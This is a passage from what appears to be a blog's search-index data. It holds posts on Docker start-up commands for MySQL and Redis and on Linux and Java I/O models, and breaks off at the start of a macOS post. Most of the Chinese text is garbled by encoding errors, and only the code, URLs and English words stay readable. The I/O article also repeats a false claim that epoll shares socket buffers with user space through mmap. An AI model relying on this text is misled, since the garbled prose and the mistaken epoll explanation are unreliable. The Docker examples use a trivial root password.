http://www.zhimaruanjian.com/","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"å¸¸ç”¨dockerå¿«é€Ÿå¯åŠ¨å‘½ä»¤","url":"%2Fp%2F4aa4f44c.html","content":"\n# 1. mysql\n\n### 1.1 å¯åŠ¨5.7ç‰ˆæœ¬\n\n```bash\ndocker pull mysql:5.7\ndocker run -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\n```\n\n<!-- more -->\n\n### 1.2 å¯åŠ¨æœ€æ–°ç‰ˆæœ¬\n\n```bash\ndocker pull mysql:latest   \ndocker run -p 3307:3306 --name mysql_latest -e MYSQL_ROOT_PASSWORD=123456 -d mysql:latest\n```\n\nçœ‹æœ€æ–°ç‰ˆæœ¬å¯¹åº”çš„ç‰ˆæœ¬å·:\n\n```Â bash\ndocker run --rm mysql:latest mysql -V\n```\n\n\n\n# 2. redis\n\n### 2.1 å¯åŠ¨æœ€æ–°ç‰ˆæœ¬\n\n```bash\ndocker pull redis:latest\ndocker run -d --name redis -p 6379:6379 redis:latest  --requirepass \"123456\"\n```\n\nçœ‹æœ€æ–°ç‰ˆæœ¬å¯¹åº”çš„ç‰ˆæœ¬å·:\n\n```bash\ndocker run --rm redis:latest redis-cli -v\n```\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"ioæ¨¡å‹","url":"%2Fp%2F9864e52a.html","content":"\n# 1. IO æ¨¡å‹\n\nå…ˆæŠ›å‡ºæ¥ç€çŸ¥ä¹çš„ä¸€ä¸ªé—®é¢˜:\n\nepollæŠ€æœ¯å±äºIOå¤ç”¨ï¼ŒIOå¤ç”¨å±äºåŒæ­¥IOï¼Œæ‰€ä»¥epollå±äºåŒæ­¥IOï¼Œè¿™åº”è¯¥æ˜¯æ²¡æ¯›ç—…çš„ã€‚\n\nç°åœ¨æˆ‘ç”¨äº†ä¸€ä¸ªæ¡†æ¶ï¼Œæ¯”å¦‚twistedï¼Œé‡Œé¢çš„reactoræ¨¡å¼çš„å®ç°æ˜¯åŸºäºepollæˆ–è€…pollçš„ï¼Œåœ¨IOçš„èŒƒç•´åº”è¯¥æ˜¯å±äºåŒæ­¥IOï¼Œä½†æ˜¯ç½‘ä¸Šå‡ ä¹æ‰€æœ‰çš„æ–‡ç« éƒ½è¯´twistedæ˜¯å¼‚æ­¥çš„ã€‚\n\næˆ‘çš„é—®é¢˜æ˜¯ï¼Œå¼‚æ­¥ä¸å¼‚æ­¥IOæ˜¯ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Ÿæœ‰æ²¡æœ‰å¯èƒ½å¼‚æ­¥å¯ä»¥ç”±åŒæ­¥IO(epollæˆ–poll)å®ç°ï¼Ÿ\n\n<!-- more -->\n\n### 1.1 åŒæ­¥å¼‚æ­¥ä¸é˜»å¡éé˜»å¡\n\né˜»å¡éé˜»å¡ä¸åŒæ­¥å¼‚æ­¥æ˜¯ä¸åŒå±‚æ¬¡çš„é—®é¢˜ã€‚\n\nä¸€ä¸ªç½‘ç»œåŒ…ä»åº”ç”¨ç¨‹åºAå‘åˆ°å¦ä¸€å°ç”µè„‘ä¸Šçš„åº”ç”¨ç¨‹åºBï¼Œéœ€è¦ç»å†ï¼š\n\n1. ä»Açš„ä¸šåŠ¡ä»£ç åˆ°Açš„è½¯ä»¶æ¡†æ¶\n2. ä»Açš„è½¯ä»¶æ¡†æ¶åˆ°Açš„è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå†…æ ¸\n3. ä»Aæ‰€åœ¨è®¡ç®—æœºçš„å†…æ ¸åˆ°ç½‘å¡\n4. ä»ç½‘å¡ç»è¿‡ç½‘çº¿å‘åˆ°äº¤æ¢æœºç­‰è®¾å¤‡ï¼Œå±‚å±‚è½¬å‘ï¼Œåˆ°è¾¾Bæ‰€åœ¨è®¡ç®—æœºçš„ç½‘å¡\n5. ä»Bæ‰€åœ¨è®¡ç®—æœºçš„ç½‘å¡åˆ°Bæ‰€åœ¨è®¡ç®—æœºçš„å†…æ ¸\n6. ä»Bæ‰€åœ¨è®¡ç®—æœºçš„å†…æ ¸åˆ°Bçš„ç¨‹åºçš„ç”¨æˆ·ç©ºé—´\n7. ä»Bçš„è½¯ä»¶æ¡†æ¶åˆ°Bçš„ä¸šåŠ¡ä»£ç \n\nè¿™ä¸ªå±‚çº§å…³ç³»å°±åƒæ˜¯è¿‡ç¨‹è°ƒç”¨ä¸€æ ·ï¼Œå‰ä¸€çº§è°ƒç”¨åä¸€çº§çš„åŠŸèƒ½ï¼Œåä¸€çº§è¿”å›ä¸€ä¸ªç»“æœç»™å‰ä¸€çº§ï¼ˆæ¯”å¦‚ï¼šæˆåŠŸï¼Œæˆ–è€…å¤±è´¥ï¼‰ã€‚\n\nåªæœ‰åœ¨å•ç‹¬ä¸€çº§çš„è°ƒç”¨ä¸Šï¼Œå¯ä»¥è¯´åŒæ­¥è¿˜æ˜¯å¼‚æ­¥çš„é—®é¢˜ã€‚\n\næ‰€è°“åŒæ­¥ï¼Œæ˜¯æŒ‡è°ƒç”¨åè®®ä¸­ç»“æœåœ¨è°ƒç”¨å®Œæˆæ—¶è¿”å›ï¼Œè¿™æ ·è°ƒç”¨çš„è¿‡ç¨‹ä¸­å‚ä¸åŒæ–¹éƒ½å¤„äºä¸€ä¸ªçŠ¶æ€åŒæ­¥çš„è¿‡ç¨‹ã€‚\n\nè€Œå¼‚æ­¥ï¼Œæ˜¯æŒ‡è°ƒç”¨æ–¹å‘å‡ºè¯·æ±‚å°±ç«‹å³è¿”å›ï¼Œè¯·æ±‚ç”šè‡³å¯èƒ½è¿˜æ²¡åˆ°è¾¾æ¥æ”¶æ–¹ï¼Œæ¯”å¦‚è¯´æ”¾åˆ°äº†æŸä¸ªç¼“å†²åŒºä¸­ï¼Œç­‰å¾…å¯¹æ–¹å–èµ°æˆ–è€…ç¬¬ä¸‰æ–¹è½¬äº¤ï¼›è€Œç»“æœï¼Œåˆ™é€šè¿‡æ¥æ”¶æ–¹ä¸»åŠ¨æ¨é€ï¼Œæˆ–è°ƒç”¨æ–¹è½®è¯¢æ¥å¾—åˆ°ã€‚\n\n\n\nä»è¿™ä¸ªå®šä¹‰ä¸­ï¼Œæˆ‘ä»¬çœ‹ï¼Œé¦–å…ˆ1å’Œ7ï¼Œè¿™å–å†³äºè½¯ä»¶æ¡†æ¶çš„è®¾è®¡ï¼Œå¦‚æœè½¯ä»¶æ¡†æ¶å¯ä»¥beginXXXï¼Œç„¶åç«‹å³è¿”å›ï¼Œè¿™å°±æ˜¯ä¸€ç§å¼‚æ­¥è°ƒç”¨ï¼Œå†æ¯”å¦‚javascriptå½“ä¸­çš„å¼‚æ­¥HTTPè°ƒç”¨ï¼Œä¼ å…¥å‚æ•°æ—¶æä¾›ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå›è°ƒå‡½æ•°åœ¨å®Œæˆæ—¶è°ƒç”¨ï¼Œå†æ¯”å¦‚åç¨‹æ¨¡å‹ï¼Œè°ƒç”¨æ¥å£åé©¬ä¸Šåˆ‡æ¢åˆ°å…¶ä»–åç¨‹ç»§ç»­æ‰§è¡Œï¼Œåœ¨å®Œæˆæ—¶ç”±æ¡†æ¶åˆ‡æ¢å›åˆ°åç¨‹ä¸­ï¼Œè¿™éƒ½æ˜¯å…¸å‹çš„å¼‚æ­¥æ¥å£è®¾è®¡ã€‚\n\nè€Œ2å’Œ6ï¼Œå…¶å®éƒ½éœ€è¦è°ƒç”¨æ–¹è‡ªå·±æŠŠæ•°æ®åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´é‡Œæ¬æ¥æ¬å»ï¼Œå…¶å®éƒ½æ˜¯åŒæ­¥æ¥å£ï¼Œé™¤éæ˜¯IOCPè¿™æ ·çš„ä¸“é—¨çš„å¼‚æ­¥ä¼ è¾“æ¥å£ï¼Œæ‰€ä»¥è¿™ä¸€çº§å…¶å®æ˜¯åŒæ­¥çš„ï¼Œé˜»å¡ä¸éé˜»å¡çš„åŒºåˆ«å…¶å®æ˜¯å½±å“è°ƒç”¨æ¥å£çš„ç»“æœï¼ˆåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æ˜¯å¦æå‰è¿”å›ç»“æœï¼‰ï¼Œè€Œä¸æ˜¯è°ƒç”¨æ–¹å¼ã€‚\n\n3å’Œ5ï¼Œå†…æ ¸ä¸€èˆ¬é€šè¿‡ç¼“å†²åŒºï¼Œä½¿ç”¨DMAæ¥ä¼ è¾“æ•°æ®ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥åˆæ˜¯å¼‚æ­¥çš„ã€‚\n\n4ï¼Œä»¥å¤ªç½‘æ˜¯ä¸ªåŒæ­¥æ—¶åºé€»è¾‘ï¼Œéšä¿¡å·ä¼ è¾“æ—¶é’Ÿï¼Œå¿…é¡»ä¸¤è¾¹è®¾å¤‡åŒæ—¶å°±ç»ªäº†æ‰èƒ½å¼€å§‹ä¼ è¾“æ•°æ®ï¼Œè¿™åˆæ˜¯åŒæ­¥çš„ã€‚\n\n\n\n> æ€»ç»“æ¥è¯´ï¼Œè®¨è®ºç©¶ç«Ÿæ˜¯å¼‚æ­¥è¿˜æ˜¯åŒæ­¥ï¼Œä¸€å®šè¦ä¸¥æ ¼è¯´æ˜è¯´çš„æ˜¯å“ªä¸€éƒ¨åˆ†ã€‚\n\n\n\nè¯´éé˜»å¡æ˜¯åŒæ­¥è€Œä¸æ˜¯å¼‚æ­¥ï¼Œè¿™æ¯«æ— ç–‘é—®æ˜¯æ­£ç¡®çš„ï¼Œç„¶è€Œè¯´æŸä¸ªæ¡†æ¶æ˜¯å¼‚æ­¥IOçš„æ¡†æ¶ï¼Œè¿™ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œå› ä¸ºè¯´çš„å…¶å®æ˜¯æ¡†æ¶æä¾›ç»™ä¸šåŠ¡ä»£ç çš„æ¥å£æ˜¯å¼‚æ­¥çš„ï¼Œä¸ç®¡æ˜¯å›è°ƒè¿˜æ˜¯åç¨‹ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥è¯´æŸä¸ªåº“æ˜¯å¼‚æ­¥çš„HTTPClientï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºè¯´çš„æ˜¯ç»™ä¸šåŠ¡ä»£ç çš„æ¥å£ã€‚ç”±äºé€šå¸¸å¼‚æ­¥çš„æ¡†æ¶éƒ½éœ€è¦åœ¨2ä¸­ä½¿ç”¨éé˜»å¡çš„æ¥å£ï¼Œçš„ç¡®ä¼šæœ‰å¾ˆå¤šäººæŠŠéé˜»å¡å’Œå¼‚æ­¥æ··ä¸ºä¸€è°ˆã€‚\n\n\n\n### 1.2 linux ioé˜»å¡éé˜»å¡\n\né˜»å¡å’Œéé˜»å¡çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼šè°ƒç”¨ç«¯çº¿ç¨‹åœ¨è°ƒç”¨å‡½æ•°åæ˜¯å¦ç«‹åˆ»è¿”å›ã€‚\n\n+ é˜»å¡\n\n  æœåŠ¡ç«¯è¿”å›ç»“æœä¹‹å‰ï¼Œå®¢æˆ·ç«¯çº¿ç¨‹ä¼šè¢«æŒ‚èµ·ï¼Œæ­¤æ—¶çº¿ç¨‹ä¸å¯è¢«CPUè°ƒåº¦ï¼Œçº¿ç¨‹æš‚åœè¿è¡Œã€‚\n\n+ éé˜»å¡\n\n  åœ¨æœåŠ¡ç«¯è¿”å›å‰ï¼Œå‡½æ•°ä¸ä¼šé˜»å¡è°ƒç”¨ç«¯çº¿ç¨‹ï¼Œè€Œä¼šç«‹åˆ»è¿”å›ã€‚\n\n### 1.3 linux ioåŒæ­¥å¼‚æ­¥\n\nåŒæ­¥å¼‚æ­¥çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼šæœåŠ¡ç«¯åœ¨æ‹·è´æ•°æ®æ—¶æ˜¯å¦é˜»å¡è°ƒç”¨ç«¯çº¿ç¨‹ã€‚\n\n+ åŒæ­¥\n\n  è°ƒç”¨ç«¯ä¼šä¸€ç›´ç­‰å¾…æœåŠ¡ç«¯å“åº”ï¼Œç›´åˆ°è¿”å›ç»“æœã€‚\n\n+ å¼‚æ­¥\n\n  è°ƒç”¨ç«¯å‘èµ·è°ƒç”¨ä¹‹åä¸ä¼šç«‹åˆ»è¿”å›ï¼Œä¸ä¼šç­‰å¾…æœåŠ¡ç«¯å“åº”ã€‚æœåŠ¡ç«¯é€šè¿‡é€šçŸ¥æœºåˆ¶æˆ–è€…å›è°ƒå‡½æ•°æ¥é€šçŸ¥å®¢æˆ·ç«¯ã€‚\n\n\n\n### 1.4 å…·ä½“åˆ†ç±»\n\n![1](ioæ¨¡å‹/0.png)\n\né˜»å¡IOå’Œéé˜»å¡IOéƒ½æ˜¯åŒæ­¥IOã€‚\n\n\n\n# 2. Linuxä¸‹çš„äº”ç§I/Oæ¨¡å‹(apue)\n\nLinuxä¸‹ä¸»è¦æœ‰ä»¥ä¸‹äº”ç§I/Oæ¨¡å‹ï¼š\n\n1. é˜»å¡I/Oï¼ˆblocking IOï¼‰\n2. éé˜»å¡I/O (nonblocking I/O)\n3. I/O å¤ç”¨ (I/O multiplexing)ï¼ˆselectã€pollã€linux 2.6ç§æ”¹è¿›çš„epollï¼‰\n4. ä¿¡å·é©±åŠ¨I/O (signal driven I/O (SIGIO))\n5. å¼‚æ­¥I/O (asynchronous I/O)\n\n\n\n### 2.1 é˜»å¡IO æ¨¡å‹\n\n> æœ€å‚», ä¸èƒ½å¿\n\nè¿›ç¨‹ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æ•°æ®æ‹·è´å®Œæˆ åº”ç”¨ç¨‹åºè°ƒç”¨ä¸€ä¸ªIOå‡½æ•°ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºé˜»å¡ï¼Œç­‰å¾…æ•°æ®å‡†å¤‡å¥½ã€‚æ•°æ®å‡†å¤‡å¥½åï¼Œä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼ŒIOå‡½æ•°è¿”å›æˆåŠŸæŒ‡ç¤ºã€‚\n\n![1](ioæ¨¡å‹/1.png)\n\n\n\n### 2.2 éé˜»å¡IOæ¨¡å‹\n\n> å¾ªç¯è°ƒç”¨è¯¢é—®, okäº†å¼€å§‹æ‹·è´, æ‹·è´ä¸­éœ€è¦ç­‰å¾…ã€‚\n\né€šè¿‡è¿›ç¨‹åå¤è°ƒç”¨IOå‡½æ•°ï¼Œåœ¨æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´è¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚\n\n![1](ioæ¨¡å‹/1.png)\n\n### 2.3 IOå¤ç”¨æ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥,   æ‹·è´ä¸­éœ€è¦ç­‰å¾…\n\nä¸»è¦æ˜¯selectå’Œepollã€‚ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¯¹å¤šä¸ªIOç«¯å£è¿›è¡Œç›‘å¬ï¼Œå½“socketæœ‰è¯»å†™äº‹ä»¶æ—¶åˆ†å‘åˆ°å…·ä½“çš„çº¿ç¨‹è¿›è¡Œå¤„ç†ã€‚\n\n![1](ioæ¨¡å‹/3.png)\n\n\n\n### 2.4 ä¿¡å·é©±åŠ¨IOæ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥,   æ‹·è´ä¸­éœ€è¦ç­‰å¾…\n\né¦–å…ˆæˆ‘ä»¬å…è®¸Socketè¿›è¡Œä¿¡å·é©±åŠ¨IO,å¹¶å®‰è£…ä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œè¿›ç¨‹ç»§ç»­è¿è¡Œå¹¶ä¸é˜»å¡ã€‚å½“æ•°æ®å‡†å¤‡å¥½æ—¶ï¼Œè¿›ç¨‹ä¼šæ”¶åˆ°ä¸€ä¸ªSIGIOä¿¡å·ï¼Œå¯ä»¥åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨I/Oæ“ä½œå‡½æ•°å¤„ç†æ•°æ®ã€‚\n\n![1](ioæ¨¡å‹/4.png)\n\n### 2.5 å¼‚æ­¥IOæ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥, æ‹·è´å®Œæˆåè¢«é€šçŸ¥\n\nç›¸å¯¹äºåŒæ­¥IOï¼Œå¼‚æ­¥IOä¸æ˜¯é¡ºåºæ‰§è¡Œã€‚ç”¨æˆ·è¿›ç¨‹è¿›è¡Œaio_readç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œæ— è®ºå†…æ ¸æ•°æ®æ˜¯å¦å‡†å¤‡å¥½ï¼Œéƒ½ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹ï¼Œç„¶åç”¨æˆ·æ€è¿›ç¨‹å¯ä»¥å»åšåˆ«çš„äº‹æƒ…ã€‚ç­‰åˆ°socketæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå†…æ ¸ç›´æ¥å¤åˆ¶æ•°æ®ç»™è¿›ç¨‹ï¼Œç„¶åä»å†…æ ¸å‘è¿›ç¨‹å‘é€é€šçŸ¥ã€‚IOä¸¤ä¸ªé˜¶æ®µï¼Œè¿›ç¨‹éƒ½æ˜¯éé˜»å¡çš„ã€‚\n\n![1](ioæ¨¡å‹/5.png)\n\n\n\n\n\n# 3. Linuxäº”ç§IOæ¨¡å‹æ¯”è¾ƒ\n\n### 3.1 åŒæ­¥IOå’Œå¼‚æ­¥IOçš„åŒºåˆ«\n\nA synchronous I/O operation causes the requesting process to be blocked until that I/O operation completes;\nAn asynchronous I/O operation does not cause the requesting process to be blocked;\n\nä¸¤è€…çš„åŒºåˆ«å°±åœ¨äºåŒæ­¥IO åš IOæ“ä½œçš„æ—¶å€™ä¼šå°†processé˜»å¡ã€‚\n\n\n\næŒ‰ç…§è¿™ä¸ªå®šä¹‰ï¼Œä¹‹å‰æ‰€è¿°çš„blocking IOï¼Œnon-blocking IOï¼ŒIO multiplexingéƒ½å±äºsynchronous IOã€‚æ³¨æ„åˆ°non-blocking IOä¼šä¸€ç›´è½®è¯¢(polling)ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯æ²¡æœ‰é˜»å¡çš„ï¼Œä½†æ˜¯recvfromé˜¶æ®µblocking IO,non-blocking IOå’ŒIO multiplexingéƒ½æ˜¯é˜»å¡çš„ã€‚\n\nè€Œasynchronous IOåˆ™ä¸ä¸€æ ·ï¼Œå½“è¿›ç¨‹å‘èµ·IO æ“ä½œä¹‹åï¼Œå°±ç›´æ¥è¿”å›å†ä¹Ÿä¸ç†ç¬äº†ï¼Œç›´åˆ°kernelå‘é€ä¸€ä¸ªä¿¡å·ï¼Œå‘Šè¯‰è¿›ç¨‹è¯´IOå®Œæˆã€‚åœ¨è¿™æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹å®Œå…¨æ²¡æœ‰è¢«blockã€‚\n\n\n\n### 3.2 æ€»ç»“\n\nPOSIXæŠŠI/Oæ“ä½œåˆ’åˆ†æˆä¸¤ç±»ï¼š\n\n- åŒæ­¥I/O: åŒæ­¥I/Oæ“ä½œå¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ï¼Œç›´è‡³æ“ä½œå®Œæˆ\n\n- å¼‚æ­¥I/O: å¼‚æ­¥I/Oæ“ä½œä¸å¯¼è‡´è¯·æ±‚é˜»å¡\n  \n\næ‰€ä»¥Unixçš„å‰å››ç§I/Oæ¨¡å‹éƒ½æ˜¯åŒæ­¥I/O, åªæœ‰æœ€åä¸€ç§æ‰æ˜¯å¼‚æ­¥I/Oã€‚\n\n+ é˜»å¡IOæ¨¡å‹ï¼Œéé˜»å¡IOæ¨¡å‹ï¼ŒIOå¤ç”¨æ¨¡å‹ï¼Œä¿¡å·é©±åŠ¨IOæ¨¡å‹éƒ½æ˜¯åŒæ­¥IOã€‚ \n+ éé˜»å¡ä¹‹æ‰€ä»¥æ˜¯åŒæ­¥, æ˜¯å› ä¸ºrecvfromä¼šå°†æ•°æ®ä»kernelæ‹·è´åˆ°ç”¨æˆ·å†…å­˜ä¸­ï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹æ˜¯è¢«blockäº†ï¼Œåœ¨è¿™æ®µæ—¶é—´å†…ï¼Œè¿›ç¨‹æ˜¯è¢«blockçš„ã€‚\n\n![1](ioæ¨¡å‹/6.png)\n\n\n\n\n\n# 4. JAVA IO å’Œ linux IO\n\n### 4.1 JAVA IO\n\n+ BIO(Blocking I/O)\n\n  \n\n+ NIO(Non-blocking I/O)\n\n  åœ¨Javaé¢†åŸŸï¼Œä¹Ÿç§°ä¸ºNew I/Oã€‚ \n  \n  Java NIO ([JSR 51](https://www.jcp.org/en/jsr/detail?id=51))å®šä¹‰äº†Java new I/O APIï¼Œææ¡ˆ2000å¹´æå‡º,2002å¹´æ­£å¼å‘å¸ƒã€‚ JDK 1.4èµ·åŒ…å«äº†ç›¸åº”çš„APIå®ç°ã€‚ \n  \n  \n\n+ AIO(Asynchronous I/O)\n\n    JAVA NIO2 ([JSR 203](https://www.jcp.org/en/jsr/detail?id=203))å®šä¹‰äº†æ›´å¤šçš„ New I/O APIsï¼Œ ææ¡ˆ2003æå‡ºï¼Œç›´åˆ°2011å¹´æ‰å‘å¸ƒï¼Œ æœ€ç»ˆåœ¨JDK 7ä¸­æ‰å®ç°ã€‚\n\nå½“å‰å¾ˆå¤šçš„é¡¹ç›®è¿˜åœç•™åœ¨JAVA NIOçš„å®ç°ä¸Šï¼Œ å¯¹JAVA AIO(asynchronous I/O)ç€å¢¨ä¸å¤šã€‚\n\n\n\n### 4.2 å¯¹åº”å…³ç³»\n\nå†æ¬¡é‡å¤linuxçš„å‰å››ç§I/Oæ¨¡å‹éƒ½æ˜¯åŒæ­¥I/O, åªæœ‰æœ€åä¸€ç§æ‰æ˜¯å¼‚æ­¥I/Oã€‚\n\n+ ä¼ ç»Ÿçš„Java BIO (blocking I/O)æ˜¯Unix I/Oæ¨¡å‹ä¸­çš„ç¬¬ä¸€ç§ã€‚\n+ Java NIOä¸­å¦‚æœä¸ä½¿ç”¨selectæ¨¡å¼ï¼Œè€ŒåªæŠŠchannelé…ç½®æˆnonblockingåˆ™æ˜¯ç¬¬äºŒç§æ¨¡å‹ã€‚\n+ Java NIO selectå®ç°çš„æ˜¯ä¸€ç§å¤šè·¯å¤ç”¨I/Oã€‚ åº•å±‚ä½¿ç”¨epollæˆ–è€…ç›¸åº”çš„pollç³»ç»Ÿè°ƒç”¨ã€‚\n+ ç¬¬å››ç§æ¨¡å‹JDKåº”è¯¥æ˜¯æ²¡æœ‰å®ç°ã€‚\n+ Java NIO2å¢åŠ äº†å¯¹ç¬¬äº”ç§æ¨¡å‹çš„æ”¯æŒï¼Œä¹Ÿå°±æ˜¯AIOã€‚\n\n\n\n#  5. å¤´è„‘é£æš´\n\n### 5.1 epoll æ˜¯åŒæ­¥è¿˜æ˜¯å¼‚æ­¥\n\nIOæ“ä½œåŒ…æ‹¬ï¼š1.ç­‰å¾…æ•°æ®å‡†å¤‡å¥½ã€‚2.ä»å†…æ ¸åˆ°è¿›ç¨‹æ‹·è´æ•°æ®ã€‚\n\nåŒæ­¥IOå’Œå¼‚æ­¥IOçš„åŒºåˆ«ï¼š1. åŒæ­¥IOå¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ï¼Œç›´åˆ°IOæ“ä½œå®Œæˆã€‚2. å¼‚æ­¥IOä¸å¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ã€‚\n\nå¾—åˆ°çš„ç»“è®ºï¼š\n\n1. é˜»å¡IOæ¨¡å‹ï¼Œéé˜»å¡IOæ¨¡å‹ï¼ŒIOå¤ç”¨æ¨¡å‹ï¼Œä¿¡å·é©±åŠ¨IOæ¨¡å‹éƒ½æ˜¯åŒæ­¥IOã€‚\n\n2. epollä¹Ÿæ˜¯IOå¤ç”¨æ¨¡å‹ï¼Œåº”è¯¥æ˜¯åŒæ­¥IOã€‚\n\n\n\næ­¤æ—¶åˆæ„å¤–äº†ï¼Œå†çœ‹åˆ°ä¸€ä¸ªè§£é‡Šï¼š\n\næ›´ä¸ºé‡è¦çš„æ˜¯, epoll å› ä¸ºé‡‡ç”¨ mmapçš„æœºåˆ¶, ä½¿å¾— å†…æ ¸socket bufferå’Œ ç”¨æˆ·ç©ºé—´çš„ bufferå…±äº«, ä»è€Œçœå»äº† socket data copy, è¿™ä¹Ÿæ„å‘³ç€, å½“epoll å›è°ƒä¸Šå±‚çš„ callbackå‡½æ•°æ¥å¤„ç† socket æ•°æ®æ—¶, æ•°æ®å·²ç»ä»å†…æ ¸å±‚ \"è‡ªåŠ¨\" åˆ°äº†ç”¨æˆ·ç©ºé—´, è™½ç„¶å’Œ ç”¨poll ä¸€æ ·, ç”¨æˆ·å±‚çš„ä»£ç è¿˜å¿…é¡»è¦è°ƒç”¨ read/write, ä½†è¿™ä¸ªå‡½æ•°å†…éƒ¨å®ç°æ‰€è§¦å‘çš„æ·±åº¦ä¸åŒäº†.\n\n\n\n\nç”¨ poll æ—¶, pollé€šçŸ¥ç”¨æˆ·ç©ºé—´çš„Appliationæ—¶, æ•°æ®è¿˜åœ¨å†…æ ¸ç©ºé—´, æ‰€ä»¥Appliationè°ƒç”¨ read API æ—¶, å†…éƒ¨ä¼šåš copy socket data from kenel space to user space.\n\nè€Œç”¨ epoll æ—¶, epoll é€šçŸ¥ç”¨æˆ·ç©ºé—´çš„Appliationæ—¶?, æ•°æ®å·²ç»åœ¨ç”¨æˆ·ç©ºé—´, æ‰€ä»¥ Appliationè°ƒç”¨ read API æ—¶?, åªæ˜¯è¯»å–ç”¨æˆ·ç©ºé—´çš„ buffer, æ²¡æœ‰ kernal spaceå’Œ user spaceçš„switchäº†.\n\n\n\näºæ˜¯æƒ³äº†ä¸€ä¸‹ï¼š\n\næ˜æ˜¾æ²¡æœ‰IOæ“ä½œçš„æ‹·è´æ•°æ®åˆ°å†…æ ¸ç©ºé—´äº†ï¼Œstevensåº”è¯¥åœ¨99å¹´å°±æŒ‚äº†ï¼Œ2.6å†…æ ¸çš„epollæ‰é‡‡ç”¨mmapæœºåˆ¶ï¼Œä¹¦ç±åæ—§äº†å§ã€‚\n\né‚£ä¹ˆepollæ˜¯å¼‚æ­¥IOäº†å§ã€‚\n\n\nç„¶åå†ä¸€çœ‹ï¼Œä½ å¦¹çš„ï¼Œè¿™è¿˜æ˜¯ä¸ç¬¦åˆå¼‚æ­¥IOå•Šï¼Œæ¯•ç«Ÿepollåœ¨å‘ŠçŸ¥OKå‰ï¼Œæ˜¯é˜»å¡äº†ï¼Œè™½ç„¶æ˜¯æ‹·è´æ•°æ®ç»“æŸäº†ã€‚\n\nçœ‹æ¥å¥½åƒåº”è¯¥ä¿®æ­£çš„æ˜¯IOæ“ä½œå®šä¹‰çš„ç¬¬äºŒæ­¥æ‰å¯¹ï¼Œè€Œä¸æ˜¯é‚£ä¸ªåŒºåˆ«ã€‚\n\nå¥½å§ï¼Œä½ å°±æš‚æ—¶å±äºåŒæ­¥IOäº†ï¼Œä¸“å¿ƒçœ‹ä»£ç ï¼Œä¸çº ç»“æ¦‚å¿µäº†ã€‚\n\n\n\nç»“è®ºå°±æ˜¯epollå±äºåŒæ­¥éé˜»å¡æ¨¡å‹ï¼Œè¿™ä¸ªä¸œè¥¿è²Œä¼¼ç›®å‰è¿˜æ˜¯æœ‰äº‰è®®ï¼Œåœ¨æ–°çš„2.6å†…æ ¸ä¹‹åï¼Œepollåº”è¯¥å±äºå¼‚æ­¥ioçš„èŒƒå›´äº†ï¼Œgolangçš„é«˜å¹¶å‘ç‰¹æ€§å°±æ˜¯åº•å±‚å°è£…äº†epollæ¨¡å‹çš„å‡½æ•°ï¼Œä½†ä¹Ÿæœ‰æ–‡ç« æŒ‡å‡ºepollå±äºâ€œä¼ªAIOâ€ï¼ŒçœŸæ­£çš„æ¨åŠ¨åŠ›å®é™…åœ¨ç³»ç»Ÿå†…æ ¸ï¼Œå¦å¤–mmapçš„åº”ç”¨åŠ å¿«äº†ç”¨æˆ·å±‚å’Œå†…æ ¸å±‚çš„æ¶ˆæ¯äº¤æ¢ï¼Œå¯¹å¹¶å‘æ•ˆç‡ä¹Ÿæœ‰æå¤§çš„æå‡ã€‚\n\n \n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/457c2d1f.html\n\n+ https://www.zhihu.com/question/19732473/answer/117012135\n+ https://juejin.im/post/6844903782094995470\n+ https://colobu.com/2014/11/13/java-aio-introduction/\n\n+ https://www.cnblogs.com/dolphin0520/p/3916526.html\n\n","tags":["io"],"categories":["io"]},{"title":"macè®¾ç½®é»˜è®¤è¾“å…¥æ³•","url":"%2Fp%2F88c7abb.html","content":"\nä¸­æ–‡è¾“å…¥æ³•ä½œä¸ºé¦–é€‰è¾“å…¥æ³•, ç®€å•ä¸€æ­¥, å´èƒ½è®©ä½ ä½¿ç”¨ macOS çš„å¹¸ç¦æ„Ÿæå‡ä¸€å¤§æˆªã€‚\n\n<!-- more -->\n\n### 1. 